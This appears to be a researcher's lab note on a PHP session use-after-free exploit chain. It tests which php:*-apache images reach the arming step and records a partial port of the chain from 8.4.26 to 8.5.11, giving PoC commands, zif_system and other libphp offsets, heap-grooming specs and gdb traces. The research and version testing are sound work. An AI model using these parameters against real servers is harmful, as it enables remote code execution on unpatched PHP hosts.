# Which builds still arm (version matrix)

The chain needs one very specific failure: an allocation refused **at the session encoder**, with a page
still free in the current chunk, so that `PS(id)` is left dangling. On 8.4.26 that failure is a
`4096`-byte page request inside `php_url_encode`; it is the arming signature, and it can be looked for
on any build without calibrating addresses. This document records that lookup across the official
`php:*-apache` images.

## Protocol

One stock image per row, no rebuilds, one Apache child
(`lab/apache-single-worker.conf`), `memory_limit = 128M`, everything else from the image's
`php.ini-production`. Three shapes are sent to `index.php`, chunked, with a fixed session id:

| shape | body |
|---|---|
| **S1 native** | `--parts 860 --big 78 --big-len 8000` &#8212; the shape the chain actually uses |
| **S2 chunk fill** | `--parts 0 --big 78 --big-len 1500000` &#8212; values below the huge threshold, so they occupy chunk pages |
| **S3 huge fill** | `--parts 0 --big 78 --big-len 3000000` &#8212; values above 2 MiB, allocated outside chunks |

The failing allocation is read from the container log, sliced to the lines produced by that one request
(a container log keeps older lines, so an unsliced grep will happily report the previous run's OOM).

```bash
# one row
docker run -d --name t -p 127.0.0.1:PORT:80 \
  -v "$PWD/lab/www:/var/www/html:ro" \
  -v "$PWD/lab/apache-single-worker.conf:/etc/apache2/mods-enabled/mpm_prefork.conf:ro" \
  php:8.5.12-apache /bin/sh -c \
  'cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini; exec apache2-foreground'
python3 poc/a1_arm.py --url http://127.0.0.1:PORT/index.php --parts 860 --big 78 --big-len 8000
docker logs t 2>&1 | grep -oE 'tried to allocate [0-9]+'
```

## The `post_max_size` gate comes first

On stock ini these images have `post_max_size = 8M`, and a 234 MB body is not parsed at all &#8212; which
looks exactly like "no OOM" and would produce a false negative:

```
78 values x 3 000 000 B, stock ini, chunked        -> post_nodes = 5,  usage 16.5 MiB
78 values x 3 000 000 B, stock ini, content-length -> post_nodes = 1
78 values x 3 000 000 B, post_max_size = 256M      -> post_nodes = 45, memory_peak = 256 613 176 B
```

Two things follow, and both matter for reading the table below.

* **Chunked framing does not bypass the gate** on these builds. It is parsed slightly further (5 nodes
  against 1) and then abandoned. Claims to the contrary do not reproduce here.
* **A no-OOM row only means something when the body was actually parsed.** S1 is 6 MB and fits under
  8M, so it runs on stock ini; S2 and S3 need `post_max_size` raised, and their rows are labelled
  accordingly.

## Results

Failing allocation per shape. `4096` = the arming signature; anything else is the parser.

| image | S1 native | S2 chunk fill | S3 huge fill |
|---|---|---|---|
| `php:8.4.26-apache` | **`4096`** &#8212; arms, full chain 3/3 | &#8212; | &#8212; |
| **`php:8.5.11-apache`** | **`4096`** (stock ini **and** `post_max_size=256M`) | `1503232` | &#8212; |
| `php:8.4.27-apache` | no OOM | `2097152` | `3014656` |
| `php:8.5.12-apache` | no OOM | `2097152` | `3014656` |
| `php:8.3.36-apache` | no OOM | `2097152` | `3014656` |
| `php:8.2.35-apache` | no OOM | `2097152` | `3014656` |

S2/S3 columns for 8.4.27, 8.5.12, 8.3.36 and 8.2.35 were measured with `post_max_size = 256M`; the S1
column was measured at stock ini, where the 6 MB body is parsed normally.

## What the table says

**`4096` is reproducible on demand, and it appears on exactly the builds that are expected to be
vulnerable.** `php:8.5.11-apache` is the positive control for the instrument: the same body that arms
8.4.26 produces the same page-sized refusal there, at stock ini, without any tuning. So the "no OOM"
cells are not an artefact of the probe &#8212; the probe sees the signature when it exists.

**The other four builds fail the same way, and it is not the same failure.** Where they do exhaust
memory, the amount refused is a 1.5 MB value (`1503232`), a 2 MiB chunk (`2097152`) or a 3 MB value
copy (`3014656`) &#8212; never a page. Their default ini, which differs from 8.4.26 in
`max_multipart_body_parts` (`-1` here, `1020`-derived from `max_input_vars` on 8.4.27), does not change
that: with the gate removed and the parser fully engaged, the granularity is still megabytes.

**8.5.12 and 8.3.36 match an independent result.** A separate PoC in this lab recorded
`php-fixed:8.5.12` and `php:8.3.36` as clean negatives (0/3 leak, 0/3 fire) and 8.3.x as structurally
blocked for this chain class. The signature table above agrees, by a different instrument.

## Porting to 8.5.11: what transfers and what does not

The table above says 8.5.11 is affected. Making our own tooling actually run there is a separate question,
and it was attempted. This is the state of that attempt, with the numbers.

**Constants that transfer.** Everything resolvable from the image's own symbol table:

| symbol | 8.5.11 | 8.4.26 |
| --- | --- | --- |
| `zval_ptr_dtor` | `libphp + 0x761B80` | `libphp + 0x638120` |
| `zif_system` | `libphp + 0x5314F0` | `libphp + 0x42CD70` |
| `zend_hash_destroy` | `libphp + 0x715A48` | `libphp + 0x5EEFC8` |
| `php_url_encode` | `libphp + 0x58B780` | `libphp + 0x484820` |

Three independent sources agree on the first two: `nm` on the extracted `libphp.so`, `gdb` resolving the
symbols in a live worker, and the 8.5.11 profile kept from the earlier lab. The module lives at
`/usr/lib/apache2/modules/libphp.so` on both images (Debian layout, not `/usr/local`).

**The arming step transfers.** A1 on a fresh 8.5.11 target at stock ini produces the same failure
(`Allowed memory size of 134217728 bytes exhausted (tried to allocate 4096 bytes)`), and the stale session
id survives into the next request - measured twice, and read directly with `gdb/a1_id_state.gdb`:

```
PS(id)=0x7fff55936000  page=0x136   gc=0x1600000001 (refcount=1 type=0x16) len=0x20     8.5.11
PS(id)=0x7fff31f37000  page=0x137   gc=0x1600000001 (refcount=1 type=0x16) len=0x20     8.4.26
val[] = 32 hex characters + NUL     <- intact on both
```

So both builds leave a *readable* `zend_string` under the dangling pointer, one page apart.

**The disclosure does not transfer.** With the 8.4.26 spec (`G:511:0x137*14,G:400:0x137,X:900`) the request
dies before the encoder ever runs:

```
#0 ps_close_files   #1 ps_open_files   #2 php_session_initialize
#3 php_session_rfc1867_callback   #4 rfc1867_post_handler   #5 sapi_handle_post
```

That stack is the explanation: `php_session_initialize` is called from inside the upload-progress callback,
i.e. **at the start of body parsing**, and it dereferences `PS(id)` through `ps_open_files -> ps_close_files`.
On 8.4.26 the page the spec forges is the page the id lives on, so that dereference reads our bytes. On
8.5.11 the id is one page lower (`0x136` against `0x137`), so the forged header misses it and the fillers
overwrite the real string header instead.

Measured with `gdb/b1_id_page.gdb` (breakpoint on `ps_close_files`, then scan for the value marker):

| spec | result |
| --- | --- |
| `G:511:0x137*14,...` | no response; marker **not** in the id chunk, not in +/-16 chunks (32 MiB) |
| `G:511:0x136*14,...` | no response; same |
| `G:510:0x136*14,...` | `200 OK`, 195 bytes, **no OOM at all** |

The middle row is the informative one: moving the header onto the id page is not enough, because the
*value itself* is not in the id chunk. `G:511` means "start at page 1 of the chunk and cover 511 pages", so
it only works if that allocation returns the chunk A1 freed. On 8.5.11 it does not: the earlier parts of the
request consume it first, and `G:510` shows the value then never reaches the ceiling at all.

**The next lever** is therefore not the header page but the *order of allocations* in the disclosure
request, so that the 511-page value is the allocation that returns to the freed chunk. The knobs are
`--prefix-count` / `--prefix-pages` and the number of `G` items; the instrument is `gdb/b1_id_page.gdb`,
because it answers "is the marker in the id chunk" before any cookie exists.

### Correction: the header page was the whole problem, and it is now fixed

Reading the `zend_string` at the moment `ps_close_files` is entered - not by scanning for a marker, which
does not exist for a `G` item because those values are filled with `A` - separates the two builds cleanly.
With the 8.4.26 spec (`p = 0x137`) on 8.5.11 the id page still holds filler:

```
8.4.26  PS(id) page 0x137  gc=0x1600000000 (refcount=0 type=0x16) len=0xc8000   <- forged header
8.5.11  PS(id) page 0x136  gc=0x4141414141414141 len=0x4141414141414141        <- plain 'A'
```

With `p = 0x136` the same read on 8.5.11 returns `gc=0x1600000000 ... len=0xc8000`, byte for byte what
8.4.26 shows. So the page is the right one, the forge lands, and the value *is* in the id chunk - the
earlier "marker not found" was an artefact of looking for a marker that `G` items never write.

**What remains is a different obstacle, and it is not the length.** Even with the forge confirmed, the
request still dies, and shrinking the claimed length does not help:

| `--fake-len` | result |
| --- | --- |
| `0xC8000` (800 KiB) | no response |
| `0x80000` (512 KiB) | no response |
| `0x8000` (32 KiB) | no response |

### A retraction: the `ps_close_files` stack was an artefact

An earlier version of this section blamed `ps_close_files` (`ps_open_files <- php_session_initialize <-
php_session_rfc1867_callback`) and called it the obstacle. That attribution does not survive its own
control. Catching the SIGSEGV with gdb attached - `handle SIGSEGV stop print`, then `bt` - produces
byte-identical results on **both** builds:

```
                       8.5.11                    8.4.26
pc            ps_close_files+84  ldr w1,[x0,#4]   ps_close_files+84  ldr w1,[x0,#4]
x0            0x4f49535345535f50                  0x4f49535345535f50
si_addr       0x4f49535345535f54                  0x4f49535345535f54
```

`x0` is the ASCII text `P_SESSIO...`, i.e. bytes of the upload-progress field name being used as a pointer:
a corrupted linked list, in the abort path. 8.4.26 does **not** do this when no debugger is attached - it
discloses and returns a cookie. So this fault is caused by **stopping the worker inside the request**, not
by the build, and any stack obtained that way is worthless as evidence.

What is still true, from container logs with no debugger involved:

- 8.4.26 completes the disclosure under the same spec;
- 8.5.11 logs `child pid N exit signal Segmentation fault (11)` and returns nothing.

So the difference is real, and its cause is currently **unattributed**. The lesson is the same class as
item 10 in `HISTORY.md` (the instrument's stream is not the event): attaching a debugger changes the
timing of a request that depends on allocation order.

**How to get the cause without perturbing the request:** a post-mortem from a core file. `ulimit -c` and
`kernel.core_pattern` are host-wide, so the cleanest version is to run the target with a core-absolute
pattern, let the worker die on its own, and read the backtrace from the core - no attach, no stop, no
observer effect. Until that is done, the honest statement is: the forge lands, the request dies, and why
is not yet known.

**Also measured:** `main - idchunk = 0x1000000` on 8.5.11 (against `0x400000` on 8.4.26). That number turns
the disclosed chunk into the main chunk, so it needs confirming over several fresh containers once a leak
exists.

Instruments added by this attempt, all kept:

- `gdb/a1_id_state.gdb` - is the string under `PS(id)` intact after arming;
- `gdb/b1_id_page.gdb` - the id page, plus every chunk around it that carries the value marker;
- `gdb/b1_page_finder.gdb` - where the encoder reads from, when it is reached at all.

## Limits

- The signature is not the chain. A `4096` says the arming step is reachable; it does not by itself
  prove disclosure or execution, which need addresses recalibrated for that build. The full chain was
  verified end-to-end on 8.4.26 (3/3) and, by the separate PoC, on 8.5.11 (3/3).
- Stock `php:*-apache` images only, aarch64, single Apache child. No FPM row here (FPM cannot carry the
  state across requests at all, see [FPM.md](FPM.md)), no x86_64, no distro packages, no opcache.
- "No OOM" is a statement about these three shapes and this ini. It is not a proof that no body
  exhausting a page can be built for these builds; it is the same class of evidence as the negative
  control, one instrument stronger because the positive control is on a different branch.
